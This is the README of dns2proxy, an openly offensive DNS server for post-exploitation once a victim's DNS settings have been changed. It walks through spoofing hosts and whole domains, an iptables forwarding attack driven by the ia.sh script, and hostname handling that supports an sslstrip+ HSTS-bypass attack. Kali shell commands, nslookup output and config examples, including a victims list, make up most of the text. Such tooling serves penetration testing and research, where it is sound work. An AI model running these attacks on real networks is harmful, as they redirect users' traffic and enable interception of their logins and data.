dns2proxy  
=========  
  
Offensive DNS server  
  
This tools offer a different features for post-explotation once you change the DNS server to a Victim.
<Referer to help (-h) to new params options>
  
Feature 1  
---------  
  
Traditional DNS Spoof adding to the response the original IP address.  
  
Using spoof.cfg file:  
  
   hostname ip.ip.ip.ip  
  
>root@kali:~/dns2proxy# echo "www.s21sec.com 1.1.1.1" > spoof.cfg  
>  
>// launch in another terminal dns2proxy.py  
>  
>root@kali:~/dns2proxy# nslookup www.s21sec.com 127.0.0.1  
>Server:         127.0.0.1  
>Address:        127.0.0.1#53  
>  
>Name:   www.s21sec.com  
>Address: 1.1.1.1  
>Name:   www.s21sec.com  
>Address: 88.84.64.30  
  
  
or you can use domains.cfg file to spoof all host of a same domain:  
  
>root@kali:~/demoBH/dns2proxy# cat dominios.cfg  
>.domain.com 192.168.1.1  
>  
>root@kali:~/demoBH/dns2proxy# nslookup aaaa.domain.com 127.0.0.1  
>Server:         127.0.0.1  
>Address:        127.0.0.1#53  
>  
>Name:   aaaa.domain.com  
>Address: 192.168.1.1  
 
Hostnames at nospoof.cfg will no be spoofed.  
  
Feature 2  
---------  
  
This feature implements the attack of DNS spoofing adding 2 IP address at the top of the resolution and configuring the system to forward the connections.  
Check my slides at BlackHat Asia 2014 [OFFENSIVE: EXPLOITING DNS SERVERS CHANGES] (http://www.slideshare.net/Fatuo__/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) and the [Demo Video] (http://www.youtube.com/watch?v=cJtbxX1HS5I).    
  
To launch this attach there is a shellscript that automatically configure the system using IP tables. You must edit this file to adapt it to your system. DON´T FORGET AdminIP variable!!!!  
Both IPs must be at the same system to let dns2proxy.py configurate the forwarding  
  
Usage: ia.sh < interface > [ip1] [ip2]   
  
  
>root@kali:~/dns2proxy# ./ia.sh eth0 172.16.48.128 172.16.48.230  
>Non spoofing imap.gmail.com  
>Non spoofing mail.s21sec.com  
>Non spoofing www.google.com  
>Non spoofing www.apple.com  
>Non spoofing ccgenerals.ms19.gamespy.com  
>Non spoofing master.gamespy.com  
>Non spoofing gpcm.gamespy.com  
>Non spoofing launch.gamespyarcade.com  
>Non spoofing peerchat.gamespy.com  
>Non spoofing gamestats.gamespy.com  
>Specific host spoofing www.s21sec.com with 1.1.1.1  
>Specific domain IP .domain.com with 192.168.1.1  
>binded to UDP port 53.  
>waiting requests.  
>Starting sniffing in (eth0 = 172.16.48.128)....  
>  
>< at other terminal >  
>  
>root@kali:~/dns2proxy# nslookup www.microsoft.com 127.0.0.1  
>Server:         127.0.0.1  
>Address:        127.0.0.1#53  
>  
>Name:   www.microsoft.com  
>Address: 172.16.48.128  
>Name:   www.microsoft.com  
>Address: 172.16.48.230  
>Name:   www.microsoft.com  
>Address: 65.55.57.27  
  
  
The fhtang.sh script will terminate the program and restore normal iptables.  
  
Hostnames at nospoof.cfg will no be spoofed.  
  
  
Feature 3  
---------  
  
Automatically the dns server detects and correct the changes thats my sslstrip+ do to the hostnames to avoid HSTS, so will response properly.  
  
This server is necesary to make the sslstrip+ attack.  
  
>root@kali:~/dns2proxy# nslookup webaccounts.google.com 127.0.0.1    <-- DNS response like accounts.google.com  
>Server:         127.0.0.1  
>Address:        127.0.0.1#53  
>  
>Name:   webaccounts.google.com  
>Address: 172.16.48.128  
>Name:   webaccounts.google.com  
>Address: 172.16.48.230  
>Name:   webaccounts.google.com  
>Address: 74.125.200.84  
>  
>root@kali:~/dns2proxy# nslookup wwww.yahoo.com 127.0.0.1            <-- Take care of the 4 w! DNS response like  
>Server:         127.0.0.1                                                     www.yahoo.com  
>Address:        127.0.0.1#53  
>  
>Name:   wwww.yahoo.com  
>Address: 172.16.48.128  
>Name:   wwww.yahoo.com  
>Address: 172.16.48.230  
>Name:   wwww.yahoo.com  
>Address: 68.142.243.179  
>Name:   wwww.yahoo.com  
>Address: 68.180.206.184  
  
  
Instalation  
-----------  
  
dnspython (www.dnspython.com) is needed. 
Tested with Python 2.6 and Python 2.7.


Config files description
------------------------

domains.cfg (or dominios.cfg): resolve all hosts for the listed domains with the listed IP 
>Ex: 
>.facebook.com 1.2.3.4 
>.fbi.gov 1.2.3.4 

spoof.cfg : Spoof a host with a ip 
>Ex: 
>www.nsa.gov 127.0.0.1 

nospoof.cfg: Send always a legit response when asking for these hosts. 
>Ex. 
>mail.google.com 

nospoofto.cfg: Don't send fake responses to the IPs listed there. 
>Ex: 
>127.0.0.1 
>4.5.6.8 

victims.cfg: If not empty, only send fake responses to these IP addresses.
>Ex: 
>23.66.163.36 
>195.12.226.131   

resolv.conf: DNS server to forward the queries.
>Ex:
>nameserver 8.8.8.8

